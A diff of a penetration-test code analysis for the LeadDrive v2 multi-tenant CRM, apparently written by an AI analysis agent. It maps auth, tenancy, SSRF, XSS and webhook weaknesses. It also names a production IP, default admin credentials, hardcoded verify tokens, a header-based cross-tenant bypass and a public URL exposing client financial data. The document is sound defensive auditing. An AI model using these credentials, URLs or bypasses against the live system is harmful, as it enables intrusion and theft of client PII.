@@ -1,8 +1,10 @@
-# Penetration Test: Code Analysis Deliverable — LeadDrive v2 CRM
+# LeadDrive v2 — Penetration Test Code Analysis Deliverable
 
-**Date:** 2026-03-27
-**Target:** LeadDrive v2 — Next.js Multi-Tenant CRM Application
-**Analyst:** Pre-Recon Code Analysis Agent
+**Application:** LeadDrive v2 CRM
+**Target URL:** `v2.leaddrivecrm.org`
+**Production Server:** `178.156.249.177` (Hetzner VDS)
+**Analysis Date:** 2026-03-27
+**Analyst:** Code Analysis Agent (Pre-Recon Phase)
 
 ---
 
@@ -11,33 +13,31 @@
 **Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the LeadDrive v2 application.
 
 ### In-Scope: Network-Reachable Components
-- All Next.js App Router pages served at the application's public URL
-- All API routes under `/api/v1/*` and `/api/auth/*` (239+ route handlers)
-- Public endpoints: lead capture, portal authentication, webhook receivers, calendar feeds
-- Authenticated CRM endpoints: contacts, deals, invoices, budgeting, AI, workflows
-- Admin settings endpoints: SMTP, roles, permissions, user management
-- The FastAPI compute service accessible via internal Docker network (indirectly reachable via API proxy)
-- Telegram bridge service (if exposed via webhook registration)
+- All Next.js page routes and API route handlers served by the application
+- Public/unauthenticated API endpoints under `/api/v1/public/*`, `/api/v1/webhooks/*`, `/api/v1/calendar/feed/*`
+- Authenticated CRM API endpoints under `/api/v1/*`, `/api/budgeting/*`, `/api/cost-model/*`
+- Customer portal pages and API endpoints under `/portal/*`
+- Static files served from `/public/` directory (including `/public/data/` and `/public/uploads/`)
+- FastAPI compute sidecar at port 8000 (exposed to host network via docker-compose)
+- Marketing/landing pages served by the application
 
 ### Out-of-Scope: Locally Executable Only
-- `scripts/` directory (30+ migration/seed scripts, CLI-only)
-- `setup.sh` (local environment bootstrap)
-- Database migration scripts in `prisma/migrations/`
-- `cost_model_migration_data/` and `migration_data/` (data import CSVs)
-- GitHub Actions CI/CD pipelines (`.github/workflows/`)
-- Docker build processes and Dockerfiles (infrastructure, not runtime)
-- `telegram-bridge/bot.js` (standalone Node.js bot process, not web-accessible)
-- Design system documentation (`design-system/`)
+- `scripts/deploy.sh` — SSH deployment script (CLI-only, but contains committed production secrets that ARE in-scope as informational findings)
+- `scripts/create-admin.ts`, `scripts/import-v1.ts` — CLI database seeding tools
+- `migration_data/migrate.py`, `cost_model_migration_data/migrate_cost_model.py` — Python migration scripts
+- `telegram-bridge/bot.js` — Long-polling Telegram bot (no HTTP listener), but its hardcoded token is an informational finding
+- `prisma/seed.ts` — Database seeding script
+- Build tooling, ESLint config, TypeScript config
 
 ---
 
 ## 1. Executive Summary
 
-LeadDrive v2 is a multi-tenant CRM/ERP platform built on Next.js 16.1.7 with a PostgreSQL database, Redis cache, and a Python FastAPI compute microservice. The application presents a **large and complex attack surface** with 239+ API route handlers, multiple public-facing webhook receivers, a customer portal with independent authentication, AI-powered features using the Anthropic Claude API, and financial operations including invoicing and payment recording. The codebase implements role-based access control (RBAC) with 5 roles across 13+ modules and multi-tenant data isolation via Prisma middleware.
+LeadDrive v2 is a multi-tenant CRM application built with Next.js 16, React 19, Prisma ORM (PostgreSQL), and a Python FastAPI compute sidecar. The application serves organizations with lead management, invoicing, budgeting, knowledge base, customer portal, and AI-powered features. The attack surface is extensive — over 150 API endpoints are network-accessible, with approximately 20 requiring no authentication at all.
 
-The most critical security concerns center on several architectural weaknesses: (1) **hardcoded development credentials** in the authentication provider that function as a backdoor (`admin@leaddrive.com`/`admin123`), bypassing 2FA entirely; (2) a **multi-tenant isolation gap** where `findUnique()` database queries do not enforce organization-scoped filtering, enabling cross-tenant data access; (3) **SSRF vectors** through admin-configurable SMTP host/port and webhook URLs with no private IP blacklisting; and (4) multiple **stored XSS sinks** where user-controlled HTML is rendered without sanitization in knowledge base articles, email templates, and invoice documents.
+**The application has critical security deficiencies that would allow immediate compromise.** The most severe findings are: (1) a known, weak `NEXTAUTH_SECRET` deployed to production that enables JWT forgery and full impersonation of any user; (2) hardcoded default admin credentials (`admin@leaddrive.com / admin123`) that are reset on every deployment; (3) a cross-tenant data access bypass via a manipulable `x-organization-id` header that any authenticated user can exploit; and (4) real client financial/legal PII (tax IDs, bank accounts, SWIFT codes, director names) served as unauthenticated static JSON files at predictable URLs.
 
-Additional high-severity findings include: secrets (API tokens, TOTP secrets, SMTP passwords) stored unencrypted in the database and returned in plaintext API responses; rate limiting defined but not enforced on any endpoint; an unauthenticated journey processor endpoint (`/api/v1/journeys/process`) that can trigger automated email/SMS workflows; and multiple webhook endpoints with default/fallback verification tokens. The application uses NextAuth v5 beta for authentication with JWT sessions, but lacks security headers (no CSP, HSTS, X-Frame-Options), has no CSRF protection beyond NextAuth defaults, and exposes Redis and PostgreSQL services without authentication in its Docker deployment.
+Additional high-impact findings include: no webhook signature verification on WhatsApp/Facebook POST handlers (allowing arbitrary message injection), an SSRF vulnerability in the SMTP test endpoint that bypasses the existing `isPrivateHost()` protection used elsewhere, multiple stored XSS vectors through unsanitized HTML template generation (invoices, emails, offers), a Content Security Policy rendered useless by `'unsafe-eval' 'unsafe-inline'` directives, contract files uploaded to the publicly-served `public/` directory without access control, and TOTP secrets/backup codes/reset tokens stored in plaintext in the database. The combination of these vulnerabilities means an external attacker can likely achieve full administrative access, cross-tenant data exfiltration, and persistent XSS within a single engagement session.
 
 ---
 
@@ -45,26 +45,42 @@ Additional high-severity findings include: secrets (API tokens, TOTP secrets, SM
 
 ### Framework & Language
 
-LeadDrive v2 is built on **Next.js 16.1.7** with **React 19.2.3** and **TypeScript 5**, using the App Router architecture. The application uses server-side rendering (SSR) and server components, with API routes defined as `route.ts` files under `src/app/api/`. Key frontend dependencies include Zustand 5.0.12 for state management, TanStack React Query 5.91.0 for data fetching, Radix UI components for the UI layer, and next-intl 4.8.3 for internationalization. Input validation uses **Zod 4.3.6** for schema validation on API request bodies. A critical security misconfiguration exists in `next.config.ts` (line 8): `typescript: { ignoreBuildErrors: true }` — this suppresses TypeScript errors at build time, meaning type-safety guarantees that could catch data-handling bugs are silently bypassed in production builds.
+LeadDrive v2 is a **Next.js 16.1.7** application using the App Router pattern with React 19.2.3, running on **Node.js 20 Alpine** in Docker. TypeScript is used with `strict: true`, but critically, `next.config.ts` sets `typescript.ignoreBuildErrors: true`, meaning type errors are silently swallowed at build time — this masks potential logic errors that could have security implications. The application uses **standalone output mode** for deployment.
 
-The backend data layer uses **Prisma 6.19.2** as the ORM connected to **PostgreSQL 16**. The Prisma schema (`prisma/schema.prisma`, 2218 lines) defines a comprehensive multi-tenant data model covering CRM contacts/companies/deals, invoicing, budgeting, support tickets, knowledge base, AI sessions, channel integrations, and workflow automation. Authentication is handled by **NextAuth v5.0.0-beta.30** — notably a beta release with potential for undiscovered security issues. Password hashing uses **bcryptjs 3.0.3** with 12 rounds, and TOTP-based 2FA is implemented via **otplib 13.4.0**. HTML sanitization uses **isomorphic-dompurify 3.5.1**, though it is inconsistently applied.
+The data layer consists of **PostgreSQL 16** via **Prisma 6.x ORM** and **Redis 7** (referenced but the in-app rate limiter uses an in-memory `Map` instead). A **Python 3.12 FastAPI** sidecar (`services/compute/`) handles cost model analytics computation and runs with `uvicorn --reload` even in the production Docker image — enabling hot-reload in production is a security concern as it monitors the filesystem for changes.
+
+**Key dependencies with security implications:**
+- `next-auth@5.0.0-beta.30` — Pre-release version, likely contains unfixed CVEs
+- `isomorphic-dompurify` — HTML sanitization (used inconsistently)
+- `zod` — Input validation (applied to some but not all endpoints)
+- `bcryptjs` — Password hashing (inconsistent cost factors: 12 in most places, 10 in admin user update)
+- `jose` — Portal JWT handling (HS256)
+- `otplib` — TOTP 2FA implementation
+- `nodemailer` — Email sending with user-configurable SMTP
+- `@anthropic-ai/sdk` — Claude AI integration
+- `exceljs` — Excel file generation/parsing
 
 ### Architectural Pattern
 
-The system follows a **hybrid monolith + microservice** pattern. The primary Next.js application handles all web serving, API routing, authentication, and business logic. A secondary **FastAPI compute service** (Python 3.12) handles cost model calculations and AI-powered analytics, communicating with the main app via internal HTTP calls over the Docker network. An optional **Telegram bridge** (`telegram-bridge/bot.js`) runs as a standalone Node.js process. All services share the PostgreSQL database.
+The application follows a **hybrid monolith + sidecar** pattern:
 
-**Trust Boundaries:**
-| Boundary | Protocol | Security |
-|----------|----------|----------|
-| Internet → Next.js App | HTTPS (port 3000) | NextAuth session validation, middleware auth |
-| Next.js → Compute Service | HTTP (unencrypted, port 8000) | No authentication, internal Docker network only |
-| Next.js → PostgreSQL | TCP (port 5432) | Connection string credentials, no TLS |
-| Next.js → Redis | TCP (port 6379) | No authentication whatsoever |
-| Next.js → External APIs | HTTPS | Bearer tokens (WhatsApp, Anthropic), Basic Auth (Twilio) |
+```
+Internet → Nginx (port 80, HTTP only) → Next.js (port 3001/3000) → PostgreSQL (5432)
+                                                                  → Redis (6379)
+                                                                  → FastAPI Compute (8000)
+```
+
+**Trust boundary analysis:** The Next.js middleware (`src/middleware.ts`) is the sole perimeter check for the web application. The compute service has **zero authentication** — it relies entirely on Docker network isolation, but `docker-compose.yml` exposes port 8000 directly to the host (`0.0.0.0:8000`). All three backend services (PostgreSQL, Redis, Compute) are exposed on host ports in the docker-compose configuration, creating a flat trust model where any host-network access compromises all services. Redis runs with no password.
 
 ### Critical Security Components
 
-The security architecture relies on four core components: (1) **NextAuth middleware** (`src/middleware.ts`) that gates all non-public routes behind session validation and enforces 2FA; (2) **API authentication helpers** (`src/lib/api-auth.ts`) that extract organization context from headers or sessions; (3) **RBAC permissions** (`src/lib/permissions.ts`) enforcing module+action authorization; and (4) **Prisma tenant middleware** (`src/lib/prisma.ts`) that auto-injects `organizationId` filtering. However, each of these has gaps documented in subsequent sections — the middleware passes context via request headers that could be spoofed if middleware is bypassed, the tenant middleware doesn't cover `findUnique()`, and rate limiting (`src/lib/rate-limit.ts`) is defined but never wired into any route handler.
+- **Authentication:** Credentials-only provider via NextAuth v5 beta, with optional TOTP 2FA
+- **Authorization:** Role-based (admin, manager, sales, support, viewer) with permission matrix
+- **Session:** Stateless JWT cookies managed by NextAuth; separate portal JWT via `jose`
+- **Tenant Isolation:** `organizationId` foreign key on all models, but `getOrgId()` trusts a client-manipulable header
+- **Rate Limiting:** In-memory Map, applied only to auth endpoints, resets on restart
+- **Security Headers:** CSP, HSTS, X-Frame-Options configured in `next.config.ts` (but CSP is weakened by `unsafe-eval`/`unsafe-inline`)
+- **Input Sanitization:** DOMPurify for HTML rendering (inconsistently applied); Zod schemas on some endpoints
 
 ---
 
@@ -72,59 +88,69 @@ The security architecture relies on four core components: (1) **NextAuth middlew
 
 ### Authentication Mechanisms
 
-The application uses **NextAuth v5.0.0-beta.30** configured in `src/lib/auth.ts` with a single **Credentials provider** (email + password). The route handler is at `src/app/api/auth/[...nextauth]/route.ts`. Session strategy is **JWT** (line 112: `session: { strategy: "jwt" }`). The JWT token carries claims including `id`, `role`, `organizationId`, `organizationName`, `plan`, `needs2fa`, and `needsSetup2fa`. Password authentication uses bcrypt comparison, and upon successful login, the system updates `lastLoginAt` and increments `loginCount`. Google OAuth client ID/secret are in `.env.example` but the OAuth provider is **not configured** in the auth code — only Credentials provider is active.
+The application uses **NextAuth v5 beta** (`next-auth@5.0.0-beta.30`) with a **Credentials-only provider** — no OAuth/OIDC/SSO providers are configured. Authentication is handled in `src/lib/auth.ts` with a JWT session strategy. The login flow accepts `email`, `password`, and optional `totpCode` fields, validated via a Zod schema (`loginSchema`) requiring a valid email and minimum 6-character password. Password hashing uses **bcryptjs** with cost factor 12 (except for admin-initiated password changes in `src/app/api/v1/users/[id]/route.ts` line 73, which uses cost factor 10 — an inconsistency).
 
-**CRITICAL BACKDOOR:** In `src/lib/auth.ts` (lines 95-106), a hardcoded fallback exists: if the database is unreachable, credentials `admin@leaddrive.com` / `admin123` authenticate as an admin user with enterprise plan access, **completely bypassing 2FA**. This is a development convenience that constitutes a severe production vulnerability.
+**TOTP 2FA** is optional per-user, implemented via `otplib`. The middleware enforces 2FA completion by redirecting to `/login/verify-2fa` or `/login/setup-2fa`, but this is a redirect-only enforcement — the API itself does not independently block requests from sessions that haven't completed 2FA verification. Backup codes (8 codes, `crypto.randomBytes(4).toString("hex")`) are stored as plaintext JSON in the database. TOTP secrets are also stored in plaintext in the `User.totpSecret` column.
 
-**Authentication API Endpoints (Exhaustive List):**
+**Portal authentication** uses a separate JWT system via `jose` (HS256, signed with the same `NEXTAUTH_SECRET`). Portal tokens are stored in a `portal-token` cookie with 7-day expiry. The portal serves a customer-facing ticketing and knowledge base system.
+
+### Authentication API Endpoints (Exhaustive List)
+
 | Endpoint | Method | Auth Required | Purpose |
 |----------|--------|---------------|---------|
-| `/api/auth/[...nextauth]` | GET, POST | No | NextAuth session management, login, logout, CSRF |
-| `/api/v1/auth/register` | POST | No | New organization + admin user registration |
-| `/api/v1/auth/forgot-password` | POST | No | Password reset token generation |
-| `/api/v1/auth/reset-password` | POST | No | Password reset with token |
-| `/api/v1/auth/verify-2fa` | POST | Partial (session with 2FA challenge) | Login 2FA verification |
-| `/api/v1/auth/2fa` | POST | Yes | Enable/verify 2FA |
-| `/api/v1/auth/totp/setup` | POST | Yes | Generate TOTP secret + QR code |
-| `/api/v1/auth/totp/verify` | POST | Yes | Verify TOTP and enable 2FA |
-| `/api/v1/auth/totp/disable` | POST | Yes | Disable 2FA (requires password) |
-| `/api/v1/auth/totp/status` | GET | Yes | Check user's 2FA status |
-| `/api/v1/public/portal-auth` | POST, DELETE | No | Customer portal login/logout |
-| `/api/v1/public/portal-auth/register` | POST | No | Customer portal registration |
-| `/api/v1/public/portal-auth/set-password` | POST | No (token-based) | Set initial portal password |
+| `POST /api/auth/[...nextauth]` | POST | No | NextAuth sign-in (credentials) |
+| `GET /api/auth/[...nextauth]` | GET | No | NextAuth session/CSRF/providers |
+| `POST /api/v1/auth/register` | POST | No | New org + admin user registration |
+| `POST /api/v1/auth/forgot-password` | POST | No | Request password reset email |
+| `POST /api/v1/auth/reset-password` | POST | No | Consume reset token, set new password |
+| `GET/POST /api/v1/auth/2fa` | GET/POST | Session | 2FA status / setup / verify / disable |
+| `POST /api/v1/auth/verify-2fa` | POST | Session | Verify TOTP code post-login |
+| `POST /api/v1/auth/totp/setup` | POST | Session | Generate TOTP QR + secret |
+| `POST /api/v1/auth/totp/verify` | POST | Session | Activate TOTP + generate backup codes |
+| `POST /api/v1/auth/totp/disable` | POST | Session | Disable TOTP (requires password) |
+| `GET /api/v1/auth/totp/status` | GET | Session | Check TOTP enrollment status |
+| `POST /api/v1/public/portal-auth` | POST | No | Portal contact login |
+| `DELETE /api/v1/public/portal-auth` | DELETE | No | Portal logout (clears cookie) |
+| `POST /api/v1/public/portal-auth/register` | POST | No | Portal self-registration |
+| `GET/POST /api/v1/public/portal-auth/set-password` | GET/POST | No | Portal password setup via invite token |
 
-### Session Management & Token Security
+### Session Management & Cookie Configuration
 
-**Main Application Sessions:** JWT-based via NextAuth. The session cookie is set by NextAuth with default settings. NextAuth v5 uses `httpOnly` and `secure` (in production) cookies by default, but no explicit cookie configuration was found in the codebase — the application relies entirely on NextAuth defaults.
+**NextAuth Session (Main App):** Stateless JWT stored in a cookie managed by NextAuth. The JWT payload includes `role`, `organizationId`, `organizationName`, `plan`, `needs2fa`, and `needsSetup2fa`. The session secret is `NEXTAUTH_SECRET`. No explicit `secure` flag override is configured in `auth.ts` — cookie security depends on NextAuth's default behavior based on the `NEXTAUTH_URL` scheme.
 
-**Customer Portal Sessions:** Configured explicitly in `src/lib/portal-auth.ts` and `src/app/api/v1/public/portal-auth/route.ts`:
-- **Cookie name:** `portal-token`
-- **HttpOnly:** `true` (line 70 in portal-auth/route.ts)
-- **SameSite:** `"lax"` (line 70 in portal-auth/route.ts)
-- **Secure:** Not explicitly set (missing — cookies may transmit over HTTP)
-- **MaxAge:** `86400 * 7` (7 days)
-- **Path:** `"/"`
-- **JWT Algorithm:** HS256
-- **Signing Secret:** `process.env.NEXTAUTH_SECRET || "portal-secret"` (line 12 in portal-auth.ts) — **hardcoded fallback is a vulnerability**
+**Portal Session Cookie** — Configured at `src/app/api/v1/public/portal-auth/route.ts` line 70:
+```
+cookies.set("portal-token", token, { httpOnly: true, path: "/", maxAge: 86400 * 7, sameSite: "lax" })
+```
+- `httpOnly: true` ✓
+- `sameSite: "lax"` ✓
+- **`secure` flag: MISSING** — cookie can be transmitted over HTTP
+- Same configuration at `src/app/api/v1/public/portal-auth/set-password/route.ts` line 100
 
-**Password Security:** Registration uses bcrypt with 12 rounds (`src/app/api/v1/auth/register/route.ts`, line 60). User password updates use 10 rounds (`src/app/api/v1/users/[id]/route.ts`, line 73) — inconsistent. Password minimum is 8 characters for main app, but only 6 characters for portal (`src/app/api/v1/public/portal-auth/set-password/route.ts`, line 31). No complexity requirements (uppercase, numbers, special characters) are enforced.
+**CSRF Protection:** No explicit CSRF middleware or token validation exists in custom API routes. NextAuth v5 provides built-in CSRF protection for its own endpoints, but all custom `/api/v1/*` routes lack CSRF defenses. Since the session uses `sameSite: "lax"` (not `strict`), cross-site GET requests will include the session cookie.
 
 ### Authorization Model & Bypass Scenarios
 
-**RBAC Implementation** (`src/lib/permissions.ts`): Five roles — `admin`, `manager`, `sales`, `support`, `viewer` — with permissions across 13+ modules (companies, contacts, deals, leads, tasks, contracts, offers, invoices, campaigns, reports, profitability, ai, settings, users, audit). Actions are: `read`, `write`, `delete`, `export`, `admin`. Admin role has wildcard access. Permission checking is automated via `requireAuth()` in `src/lib/api-auth.ts`, which resolves the module from the URL path and the action from the HTTP method.
+**Role-Based Access Control** is defined in `src/lib/permissions.ts` with a static permission matrix mapping 5 roles (admin, manager, sales, support, viewer) to actions (read, write, delete, export, admin) across 23 modules. The `requireAuth()` function in `src/lib/api-auth.ts` enforces both authentication and permission checks.
 
-**Potential Bypass Scenarios:**
-1. **Header Spoofing:** The middleware injects `x-organization-id`, `x-user-id`, `x-user-role` headers (middleware.ts, lines 63-82). If an attacker can bypass the middleware (e.g., via a misconfigured proxy), they can spoof these headers to impersonate any user/org.
-2. **findUnique Tenant Escape:** `src/lib/prisma.ts` line 46-48 — `findUnique()` queries are NOT filtered by `organizationId`. Any endpoint using `findUnique()` with a user-supplied ID can access cross-tenant data.
-3. **Admin Settings Route Protection:** Only enforced via client-side redirect in middleware (line 84-86) — the API endpoints themselves rely on `requireAuth()` with module checks, but the redirect can be bypassed by directly calling API endpoints.
+**Critical bypass — `getOrgId()` header trust** (`src/lib/api-auth.ts` lines 43-44):
+```typescript
+const fromHeader = req.headers.get("x-organization-id")
+if (fromHeader) return fromHeader   // Returns immediately without session cross-check
+```
+The middleware injects `x-organization-id` from the authenticated session, but `getOrgId()` reads this header without verifying it matches the session's `organizationId`. An authenticated user can supply `x-organization-id: <victim-org-id>` to access another organization's data on any endpoint that uses `getOrgId()` instead of `requireAuth()`.
 
-### 2FA Implementation
+**Missing role enforcement on user management:** `src/app/api/v1/users/[id]/route.ts` — PUT and DELETE on user records only check `getOrgId()` (org membership), not whether the caller has admin role. Any authenticated viewer can modify other users' roles, passwords, or 2FA settings.
 
-TOTP-based 2FA using `otplib`. Setup generates a secret via `generateSecret()`, produces a QR code, and stores the secret in `User.totpSecret` (plaintext in database). Backup codes are 8 hex strings generated via `crypto.randomBytes(4)` (only 32 bits of entropy per code — relatively weak). 2FA is enforced at the middleware level: users with `needs2fa=true` are redirected to `/login/verify-2fa`. Backup codes are one-time use (removed from the JSON array after consumption). **TOTP secrets and backup codes are stored unencrypted in the database** — a database compromise fully defeats 2FA.
+**Plan-based feature gating bypass:** In `src/middleware.ts` line 105, the plan defaults to `"enterprise"` if missing: `const plan = session?.user?.plan || "enterprise"`. A missing plan field grants maximum feature access. API routes are explicitly excluded from plan gating.
 
-### SSO/OAuth/OIDC Flows
+### Multi-Tenancy Security
 
-Google OAuth credentials are referenced in `.env.example` but **no OAuth provider is configured** in the NextAuth setup (`src/lib/auth.ts`). There are no callback endpoints, no `state` or `nonce` parameter validation, and no OIDC discovery. The only authentication flow is email/password credentials with optional TOTP 2FA.
+All major data models include `organizationId` as a foreign key, and API routes consistently scope queries with `where: { organizationId: orgId }`. However, the `tenantPrisma()` extension in `src/lib/prisma.ts` that auto-injects organizationId is **not used by any API route** — all routes use the base `prisma` client and scope manually, creating risk of developer oversight. The `x-organization-id` header trust issue (above) is the primary tenant isolation bypass vector.
+
+### SSO/OAuth/OIDC
+
+No OAuth or OIDC providers are configured. The `.env.example` references `GOOGLE_CLIENT_ID` and `GOOGLE_CLIENT_SECRET`, but these are not wired into `auth.ts`. No state parameter validation, nonce handling, or callback URL verification exists because no external IdP integration is implemented.
 
 ---
 
@@ -132,129 +158,125 @@ Google OAuth credentials are referenced in `.env.example` but **no OAuth provide
 
 ### Database Security
 
-The application uses **PostgreSQL 16** with **Prisma 6.19.2** ORM. The database schema (`prisma/schema.prisma`, 2218 lines) defines a comprehensive multi-tenant model. All major entities include an `organizationId` foreign key for tenant scoping. Multi-tenant isolation is enforced via a Prisma `$extends()` middleware in `src/lib/prisma.ts` (lines 35-71) that automatically injects `organizationId` into `findMany`, `findFirst`, `create`, `update`, `delete`, and `count` operations. **However, `findUnique()` queries are explicitly excluded from tenant filtering** (lines 46-48), creating a critical cross-tenant data access vulnerability. Any API endpoint that uses `findUnique()` with a user-supplied ID (e.g., `/api/v1/contacts/[id]`, `/api/v1/deals/[id]`) can potentially access records from other organizations.
-
-A single raw SQL query exists in `src/app/api/budgeting/snapshot/route.ts` (lines 24-32) using `prisma.$queryRaw` with template literal parameterization — Prisma properly parameterizes this, so SQL injection risk is low. However, the query filters by `planId` and `organizationId` separately, meaning a valid `orgId` combined with a `planId` from another org could yield unexpected results if the logical validation is insufficient.
-
-**Sensitive fields stored without encryption at rest:**
+The application uses **PostgreSQL 16** via **Prisma 6.x ORM**. The schema (`prisma/schema.prisma`) defines comprehensive data models with `organizationId` foreign keys for tenant isolation. However, several critical sensitive fields lack encryption at rest:
 
 | Field | Model | Storage | Risk |
 |-------|-------|---------|------|
-| `totpSecret` | User | Plaintext string | 2FA bypass if DB compromised |
-| `backupCodes` | User | Plaintext JSON array | 2FA bypass |
-| `botToken` | ChannelConfig | Plaintext string | WhatsApp/Telegram account takeover |
-| `apiKey` | ChannelConfig | Plaintext string | API credential theft |
-| `appSecret` | ChannelConfig | Plaintext string | Integration compromise |
-| `settings.smtp.smtpPass` | Organization (JSON) | Plaintext in JSON field | SMTP credential theft |
-| `secret` | Webhook | Plaintext string | Webhook signature forgery |
-| `resetToken` | User | Plaintext hex string | Account takeover |
-| `portalVerificationToken` | Contact | Plaintext string | Portal account takeover |
+| `totpSecret` | User | Plaintext `String` | DB breach → bypass all 2FA |
+| `backupCodes` | User | Plaintext `Json` | DB breach → bypass 2FA via backup codes |
+| `resetToken` | User | Plaintext `String` | DB breach → account takeover via password reset |
+| `portalPasswordHash` | Contact | bcrypt hash ✓ | Properly hashed |
+| `portalVerificationToken` | Contact | Plaintext `String` | DB breach → portal account takeover |
+| `settings.smtp.smtpPass` | Organization | Plaintext in JSON blob | DB breach → SMTP credential theft |
+| `botToken`, `apiKey`, `appSecret` | ChannelConfig | Plaintext `String` | DB breach → messaging platform takeover |
+| `calendarToken` | User | Plaintext `String` | Token leak → org-wide task data exposure |
 
-Password hashes (`passwordHash` on User, `portalPasswordHash` on Contact) are properly stored as bcrypt hashes.
+Password reset tokens are generated with `crypto.randomBytes(32).toString("hex")` (adequate entropy) but stored in plaintext. Best practice is to store a hash of the token and compare hashes on validation.
+
+SQL injection risk is minimal — Prisma's query builder parameterizes all queries, and the one `$queryRaw` usage in `src/app/api/budgeting/snapshot/route.ts` uses Prisma's tagged template literal form (safe parameterization). No `$queryRawUnsafe` or `$executeRawUnsafe` calls were found.
 
 ### Data Flow Security
 
-**Critical Data Exposure in API Responses:**
-1. **Channel configs returned with secrets:** `src/app/api/v1/channels/route.ts` (lines 25-30) returns full `ChannelConfig` records including `botToken`, `apiKey`, and `appSecret` in plaintext to any authenticated user. No `select()` clause filters sensitive fields.
-2. **TOTP secret returned during setup:** `src/app/api/v1/auth/totp/setup/route.ts` (lines 37-44) returns the raw TOTP secret in the API response alongside the QR code.
-3. **Backup codes returned after 2FA enable:** `src/app/api/v1/auth/totp/verify/route.ts` (lines 51-54) returns all 8 backup codes in the response.
-4. **Email enumeration:** `src/app/api/v1/auth/register/route.ts` (line 29) returns "Email already registered" (409 status), enabling email enumeration. The forgot-password endpoint correctly prevents this by always returning success.
+**Publicly Exposed PII (CRITICAL):** The `public/data/` directory contains real client data served without authentication:
+- `public/data/company_details.json` — Real company names, tax IDs (VOEN), director names, physical addresses, bank names, IBAN/account numbers, SWIFT codes for dozens of Azerbaijani companies
+- `public/data/company_legal_names.json` — Legal entity names
+- `public/data/pricing_data.json` — Pricing data
+- `public/data/pricing_crm_mapping.json` — CRM mapping data
 
-**Audit Logging:** The `logAudit()` function (`src/lib/prisma.ts`, lines 73-85) stores `oldValue` and `newValue` JSON without redacting PII or sensitive data. Contact updates (e.g., `src/app/api/v1/contacts/[id]/route.ts`, line 52) log the entire parsed request body including all PII fields.
+These are accessible at `https://v2.leaddrivecrm.org/data/company_details.json` without any authentication. This constitutes a data breach exposure of real client financial and legal information.
+
+**Migration data in git:** `migration_data/company_details.json` and `cost_model_migration_data/` contain additional real client data (employee counts, salary data, contract pricing) committed to the repository. Any contributor has access.
+
+**Email logging:** Full HTML email bodies (including password reset links and portal verification tokens) are logged to the `EmailLog` table (`prisma/schema.prisma` lines 1033-1048). A database read yields active reset URLs and verification tokens.
+
+**Contract file uploads:** Files are written to `public/uploads/contracts/` with randomized filenames (`crypto.randomBytes(16).toString("hex")` + original extension). While the 16-byte random prefix provides 128 bits of entropy, the files are served statically without any authentication check — anyone who obtains or guesses the URL can download the contract document.
+
+### Channel Config Secret Exposure
+
+The `GET /api/v1/channels/:id` endpoint (`src/app/api/v1/channels/[id]/route.ts` lines 29-33) returns the full database row including `botToken`, `apiKey`, and `appSecret` fields. The list endpoint correctly excludes these via Prisma `select`, but the detail endpoint does not. Any authenticated user (including `viewer` role) can retrieve messaging platform credentials.
 
 ### Multi-Tenant Data Isolation
 
-The Prisma tenant middleware provides reasonable isolation for most operations, but has these gaps:
-1. **findUnique bypass** (documented above) — the most critical gap
-2. **Portal authentication** queries contacts without org scope at login time (`src/app/api/v1/public/portal-auth/route.ts`) — email lookup is global across all orgs
-3. **Calendar feed** token lookup (`src/app/api/v1/calendar/feed/[token]/route.ts`, line 22) queries by `calendarToken` without org scope — by design, but means a leaked token exposes all org tasks
-4. **No data export controls** — authenticated users with `export` permission can extract all org data via export endpoints with no volume limits or watermarking
+Queries are consistently scoped by `organizationId`, but the `x-organization-id` header trust issue described in Section 3 represents the primary cross-tenant data access vector. The calendar feed endpoint (`/api/v1/calendar/feed/[token]`) returns all tasks for the token owner's **entire organization** rather than just the individual user's tasks — a scope creep that leaks organizational data through a single user's calendar subscription.
 
 ---
 
 ## 5. Attack Surface Analysis
 
-### External Entry Points — Public (Unauthenticated)
+### External Entry Points — Public/Unauthenticated
 
-**1. Web-to-Lead Form (`/api/v1/public/leads` — POST)**
-File: `src/app/api/v1/public/leads/route.ts`. Accepts `{name, email, phone, company, message, source, org_slug}`. CORS allows `*` (all origins). No rate limiting. Falls back to first organization if `org_slug` not found — leads from unknown sources go to an unintended org. Maximum message length 2000 chars. **Attack vectors:** spam injection, email harvesting via org_slug enumeration, resource exhaustion.
+The middleware (`src/middleware.ts`) explicitly bypasses authentication for paths matching `/api/v1/public/*`, `/api/v1/calendar/feed/*`, `/api/v1/webhooks/*`, and `/api/v1/journeys/process`. The following endpoints require no authentication:
 
-**2. Event Registration (`/api/v1/public/events/[id]/register` — POST)**
-File: `src/app/api/v1/public/events/[id]/register/route.ts`. Creates event participant and sends confirmation email with ICS calendar attachment. Uses org SMTP settings for email delivery. **Attack vectors:** email bombing (register many times for same event), SMTP abuse via org email config, ICS injection.
+**Web-to-Lead Submission — `POST /api/v1/public/leads`** (`src/app/api/v1/public/leads/route.ts`)
+- Sets `Access-Control-Allow-Origin: *` — fully open CORS
+- Accepts JSON with `org_slug` to route leads; if slug doesn't match, **falls back to the first organization in the database**
+- No rate limiting applied
+- Attack vector: Spam any organization with fake leads; the fallback logic means even without knowing a valid slug, leads are created
 
-**3. Customer Portal Authentication (`/api/v1/public/portal-auth` — POST, DELETE)**
-File: `src/app/api/v1/public/portal-auth/route.ts`. Login with email/password, bcrypt validation, JWT cookie. Portal registration at `/register`, password setting at `/set-password`. **Attack vectors:** credential brute force (no rate limiting), account enumeration (error message differences), token theft if `Secure` flag missing on cookie.
+**Webhook Endpoints — No Signature Verification:**
+- `POST /api/v1/webhooks/whatsapp` — GET verification uses a token, but POST handler has **no HMAC signature verification** of Meta's `X-Hub-Signature-256`. Default verify token: `"leaddrive-whatsapp-verify-2026"` (hardcoded in source)
+- `POST /api/v1/webhooks/facebook` — Same pattern: POST handler lacks signature verification. Default verify token: `"leaddrive_fb_verify"` (hardcoded)
+- `POST /api/v1/webhooks/telegram` — Bot token passed as URL query parameter (`?token=...`), logged in access logs
+- `POST /api/v1/webhooks/vkontakte` — VK group_id matched against DB; confirmation code from DB
 
-**4. Portal Knowledge Base (`/api/v1/public/portal-kb` — GET)**
-Public access to published KB articles. Content rendered with `dangerouslySetInnerHTML` on the portal page. **Attack vector:** stored XSS via KB article content.
+**Portal Authentication (No Rate Limiting):**
+- `POST /api/v1/public/portal-auth` — Login endpoint reveals account existence (404 "not found" vs 403 "not activated")
+- `POST /api/v1/public/portal-auth/register` — Distinct error messages enable full user enumeration ("contact not found" vs "access not enabled" vs "already registered")
+- `POST /api/v1/public/portal-auth/set-password` — Token-gated password setup
 
